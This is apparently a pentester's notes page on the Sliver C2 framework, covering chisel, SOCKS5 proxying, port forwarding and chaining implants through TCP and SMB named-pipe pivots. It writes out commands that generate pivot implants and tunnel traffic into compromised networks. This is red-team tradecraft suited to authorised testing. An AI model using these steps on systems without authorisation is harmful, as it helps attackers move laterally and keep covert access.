| üè† [Home](../../pentesting.md) | ‚¨ÖÔ∏è ‚¨ÖÔ∏è [Part](../_part) | ‚¨ÖÔ∏è [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

-   [Port forwarding, Pivots and Socks](#port-forwarding-pivots-and-socks){#toc-port-forwarding-pivots-and-socks}
    -   [Introduction](#introduction){#toc-introduction}
        -   [Chisel pivoting](#chisel-pivoting){#toc-chisel-pivoting}
    -   [SOCKS5 / WireGuard SOCKS5](#socks5-wireguard-socks5){#toc-socks5-wireguard-socks5}
    -   [Port forwarding and Reverse Port forwarding (to finish)](#port-forwarding-and-reverse-port-forwarding-to-finish){#toc-port-forwarding-and-reverse-port-forwarding-to-finish}
    -   [Pivot (to finish)](#pivot-to-finish){#toc-pivot-to-finish}
        -   [General commands on pivots](#general-commands-on-pivots){#toc-general-commands-on-pivots}
        -   [TCP pivots](#tcp-pivots){#toc-tcp-pivots}
    -   [Named Pipe Pivots (SMB)](#named-pipe-pivots-smb){#toc-named-pipe-pivots-smb}

# Port forwarding, Pivots and Socks

## Introduction

-   **Pivot** allow you to create "**chains**" of implant connections to reach
    back C2

-   Socks / chisel / port forward allow to proxify traffic from C2

### Chisel pivoting

chisel has not yet been incorporated as an extension in Sliver. there is
an [open issue on Github by
MrAle98](https://github.com/sliverarmory/armory/issues/35) that contains
a forked version of the tool that can be used. It integrates a few
additions, such as listing the currently running tasks of chisel and
respectively stopping the tasks.

    sudo apt install mingw-w64
    git clone https://github.com/MrAle98/chisel
    cd chisel/
    mkdir ~/.sliver-client/extensions/chisel
    cp extension.json ~/.sliver-client/extensions/chisel
    make windowsdll_64
    make windowsdll_32

## SOCKS5 / WireGuard SOCKS5

In the implant executing `socks5 start -P <socks_port>` will be equals
to an `ssh -D <socks_port>` to the target hosting the implant.

SOCKS proxy feature can only be used on sessions (i.e., interactive
sessions) and not beacons.

for WireGuard SOCKS5 see [Reverse
SOCKS](https://sliver.sh/docs?name=Reverse+SOCKS)

## Port forwarding and Reverse Port forwarding (to finish)

Sliver provides two mechanisms for port forwarding to tunnel additional
connections / tools into the target environment via an implant:

-   `portfwd` - This command (available on all C2s) uses Sliver's
    in-band tunnels to transfer data between your local machine and the
    implant network (i.e., if you're using HTTP C2 all port forwarded
    traffic is tunneled over HTTP, same for mTLS/DNS/etc.)

-   `wg-portfwd` - This command uses WireGuard port forwarding, and is
    only available when using WireGuard C2.

NOTE: Generally speaking `wg-portfwd` is faster and more reliable.

    diverTCPConn.exe 445 8445
    rportfwd add -r 127.0.0.1:445 -b <ip_of_compromised_host>:8445

## Pivot (to finish)

[Pivots](https://sliver.sh/docs?name=Pivots)

Pivots in Sliver are used for specifically pivoting C2 traffic, not to
be confused with port forwarding, which is used for tunneling generic
tcp connections into a target environment.

Pivots can only be used in \"session mode\".

Pivots allow you to create \"chains\" of implant connections, for
example if you're trying to deploy a pivot into a highly restricted
subnet that cannot route traffic directly to the internet you can
instead create an implant that egresses all traffic via another implant
in a less restricted subnet.

Pivots can be arbitrarily nested, for example a pivot A can connect thru
pivot B to a third egress implant.

In Sliver you use an existing session to create a \"pivot listener\" and
then generate new pivots that can connect back to that listener, just as
you would with other C2 protocols/endpoints.

Pivots perform an authenticated peer-to-peer cryptographic key exchange
regardless of the underlying pivot protocol, therefore pivots can only
communicate with other implants generated by the same server; this
restriction cannot be disabled.

### General commands on pivots

        pivots details
        pivots graph
        pivots stop

### TCP pivots

TCP pivots are implemented in pure Go and are supported on all
platforms.

-   in a session start the tcp pivot listener
    `pivots tcp --bind <listening_ip> --lport <listening_port>`. if
    `--bind` is not specified listen on all ?

-   generate a pivot implant
    `generate --tcp-pivot <ip>:<port> -N <implant_name> --skip-symbols`
    where `ip` is the ip address where the tcp pivot is running

## Named Pipe Pivots (SMB)

In Sliver, named pipes are primarily used for pivoting on Windows.

-   in a session start the pipe pivot listener
    `pivots named-pipe --bind <pipe_name>`. Note that the default ACL
    will only allow the current user/group. You can allow all
    user/groups by using the `--allow-all` flag.

-   generate a pivot implant
    `generate --named-pipe <ip>/pipe/<pipe_name> -N <implant_name> --skip-symbols`
    where ip is the ip address where the named pipe pivot is running

`sessions` will display the conection chain.
